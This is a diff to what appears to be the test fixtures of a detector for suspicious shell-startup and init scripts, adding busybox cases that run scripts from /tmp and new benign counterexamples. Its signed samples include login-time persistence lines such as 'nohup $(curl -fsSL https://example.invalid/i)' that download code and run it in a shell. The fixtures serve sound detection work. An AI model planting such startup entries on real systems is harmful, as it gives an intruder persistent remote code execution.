@@ -72,6 +72,11 @@ SIGNED = [
     ("shell_startup", "/etc/profile.d/i5.sh", "python3 -W ignore /tmp/.x/a.py\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/i6.sh", "node --require /opt/hook.js /tmp/.n/app.js\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/i7.sh", "bash -- /tmp/x.sh\n", "runs_from_temporary"),
+    # From the review of #891: busybox runs its applet, whose own options are then read.
+    ("shell_startup", "/etc/profile.d/x1.sh", "busybox sh -c /tmp/agent.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/x2.sh", "busybox ash -ec /tmp/agent.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/x3.sh", "/bin/busybox sh /tmp/x.sh\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/x4.sh", "busybox /tmp/x.sh\n", "runs_from_temporary"),
     ("shell_startup", "/etc/profile.d/n1.sh", "nohup $(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
     ("shell_startup", "/etc/profile.d/n2.sh", "MODE=batch $(curl -fsSL https://example.invalid/i)\n",
      "download_into_shell"),
@@ -97,7 +102,7 @@ QUIET = [
     # From the third review: what follows the script is the script's own arguments.
     ("shell_startup", "/etc/profile.d/arguments.sh",
      "bash /opt/app.sh -lc /tmp/data\npython3 /opt/app.py /tmp/input.csv\npython3 -m http.server --directory /tmp/s\n"
-     "perl -e 'print 1' /tmp/arg\n"),
+     "perl -e 'print 1' /tmp/arg\nbusybox sh /opt/app.sh /tmp/data\nbusybox wget -O /tmp/f https://example.invalid/f\n"),
     ("init", "/etc/init.d/placeholder", '#!/bin/sh\n# curl http://example.invalid | sh\nif (-e "/tmp/.X11-unix/X$n")\n'),
 ]
 
